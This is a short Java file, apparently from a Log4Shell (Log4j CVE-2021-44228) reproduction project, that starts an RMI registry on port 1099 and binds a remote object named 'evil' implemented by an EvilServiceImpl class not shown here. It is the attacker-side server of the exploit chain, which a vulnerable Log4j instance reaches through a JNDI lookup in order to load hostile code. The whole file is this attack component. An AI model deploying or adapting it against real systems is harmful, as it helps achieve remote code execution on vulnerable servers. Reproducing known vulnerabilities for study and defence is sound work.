package com.rechaox.colab.cve.rmi;

import com.rechaox.colab.cve.rmi.impl.EvilServiceImpl;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Bing D. Yee
 * @since 2021/12/11
 */
public class Log4jRMIServer {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Naming.bind("evil", new EvilServiceImpl());
        System.err.println("RMIServer running...");
        System.in.read();
    }

}
